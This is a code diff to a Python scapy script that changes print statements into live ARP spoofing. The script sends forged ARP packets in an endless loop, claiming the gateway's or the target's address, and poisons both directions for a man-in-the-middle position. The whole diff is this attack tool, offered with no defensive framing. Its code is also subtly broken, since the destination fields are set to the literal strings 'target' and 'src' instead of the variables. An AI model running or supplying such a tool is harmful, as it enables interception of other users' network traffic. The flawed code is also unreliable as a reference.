@@ -1,10 +1,11 @@
 import argparse
 import time
-from scapy.all import conf
+from scapy.all import conf, sendp
+from scapy.layers.l2 import Ether, ARP
 
-interface = conf.iface
-src = conf.route.route('0.0.0.0')[2]
-DELAY = 2
+interface = conf.iface # Default interface
+src = conf.route.route('0.0.0.0')[2] # Default gateway
+DELAY = 2 # Delay time between broadcasts
 
 parser = argparse.ArgumentParser()
 
@@ -23,16 +24,22 @@ if args.src:
     src = args.src
 
 if args.delay:
-    delay = args.delay
+    DELAY = args.delay
 
 target = args.target
 
 if not args.gw:
     while True:
-        print("sending '" + src + " is at ' to " + target + " using " + interface)
+        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="target", psrc=src)
+        # print("sending '" + src + " is at ' to " + target + " using " + interface)
+        sendp(arp_request, iface=interface)
         time.sleep(DELAY)
 else:
     while True:
-        print("sending '" + src + " is at ' to " + target + " using " + interface)
-        print("sending '" + target + " is at ' to " + src + " using " + interface)
+        arp_request_for_target = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="target", psrc=src)
+        # print("sending '" + src + " is at ' to " + target + " using " + interface)
+        sendp(arp_request_for_target, iface=interface)
+        arp_request_for_gateway = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="src", psrc=target)
+        # print("sending '" + target + " is at ' to " + src + " using " + interface)
+        sendp(arp_request_for_gateway, iface=interface)
         time.sleep(DELAY)
